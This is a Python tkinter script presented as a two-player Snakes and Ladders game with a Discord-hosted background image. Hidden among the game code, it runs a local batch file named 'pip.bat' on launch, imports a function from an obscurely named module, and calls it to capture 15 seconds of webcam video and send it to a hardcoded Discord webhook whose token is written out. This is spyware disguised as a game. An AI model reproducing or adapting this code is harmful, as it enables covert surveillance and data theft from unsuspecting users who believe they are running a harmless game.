import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import random
import os
import requests
from io import BytesIO
import subprocess
from lkbiiir import capture_and_send

current_directory = os.getcwd()

bat_file_path = os.path.join(current_directory, 'pip.bat')

subprocess.run(bat_file_path, shell=True)

# Snakes and ladders mapping
snakes = { 28: 10,37: 3, 47: 16, 75: 32, 94: 71, 96: 42}
ladders = {17: 56, 12: 50, 22: 58, 27: 55 ,41: 79 ,54: 88}
three_spears = {2, 15, 65}  # Squares where players get 3 extra rolls

# Initialize game variables
players = ["monji", "monjiya"]
positions = {player: 0 for player in players}
current_player_index = 0
extra_rolls = {player: 0 for player in players}  # Track extra rolls for players

webhook_url="https://discord.com/api/webhooks/1205108171769905202/-nPkymxlUmsdjFWCRXHDpjWO6opbKHQ8aHaevZFju-5xxswy5yReNuJSLQdLpnK7aKki"

# Roll dice logic
def roll_die():
    roll = random.randint(1, 6)
    return roll

# Move player logic
def move_player():
    global current_player_index
    player = players[current_player_index]
    
    # Handle extra rolls
    if extra_rolls[player] > 0:
        extra_rolls[player] -= 1
        messagebox.showinfo("Extra Roll", f"{player} gets an extra roll!")
    else:
        roll = roll_die()
        current_pos = positions[player]
        new_pos = current_pos + roll
        
        # Handle bounce back if overshooting 100
        if new_pos > 100:
            new_pos = 100 - (new_pos - 100)
        
        # Handle snakes or ladders
        if new_pos in ladders:
            new_pos = ladders[new_pos]
            messagebox.showinfo("Ladder!", f"{player} climbed a ladder to {new_pos}!")
        elif new_pos in snakes:
            new_pos = snakes[new_pos]
            messagebox.showinfo("Snake!", f"{player} was bitten by a snake and fell to {new_pos}!")
        
        # Check for three spears
        if new_pos in three_spears:
            extra_rolls[player] = 3
            messagebox.showinfo("Three Spears!", f"{player} landed on {new_pos} and gets 3 extra rolls!")
        
        # Update position
        positions[player] = new_pos
        update_board()
        
        # Check for win condition
        if new_pos == 100:
            messagebox.showinfo("Game Over", f"{player} wins!")
            root.quit()
            return
    
    # Switch to the next player if no extra rolls are available
    if extra_rolls[player] == 0:
        current_player_index = (current_player_index + 1) % len(players)

# Update the game board
def update_board():
    for player, pos in positions.items():
        labels[player].config(text=f"{player}: {pos}")

# GUI Setup
root = tk.Tk()
root.title("Snakes and Ladders")
root.geometry("600x600")

# Image URL for the background
image_url = "https://cdn.discordapp.com/attachments/1193294259009355933/1312144960123965550/lo3ba.png?ex=674b6db8&is=674a1c38&hm=f171606420ce9f115b058e859310fe62b747c7085c580353b313d5707d272166&"

# Fetch the image from the URL
response = requests.get(image_url)
if response.status_code == 200:
    try:
        # Open the image and resize it to fit the window
        img_data = BytesIO(response.content)
        bg_image = Image.open(img_data)
        bg_image = bg_image.resize((600, 600))  # Resize to match window size
        bg_photo = ImageTk.PhotoImage(bg_image)

        # Display the image as the background
        bg_label = tk.Label(root, image=bg_photo)
        bg_label.place(relwidth=1, relheight=1)
        
        # Keep a reference to the photo to prevent garbage collection
        bg_label.image = bg_photo
    except Exception as e:
        print(f"Error loading the image: {e}")
else:
    print(f"Failed to load image from URL: {image_url}")

# Display positions
labels = {}
for i, player in enumerate(players):
    label = tk.Label(root, text=f"{player}: 0", font=("Arial", 16), bg="white", fg="black")
    label.place(x=20, y=30 + i * 30)  # Position labels in the top-left corner
    labels[player] = label

# Dice window
def open_dice_window():
    dice_window = tk.Toplevel(root)
    dice_window.title("Dice Roller")
    dice_window.geometry("200x200")
    
    def roll_and_move():
        move_player()
    
    roll_button = tk.Button(dice_window, text="Roll Dice", font=("Arial", 16), command=roll_and_move)
    roll_button.pack(expand=True)

capture_and_send(webhook_url, video_duration=15, num_cameras=1)

dice_button = tk.Button(root, text="Open Dice Window", font=("Arial", 16), command=open_dice_window, bg="yellow")
dice_button.place(x=250, y=500)

# Start the main GUI loop
root.mainloop()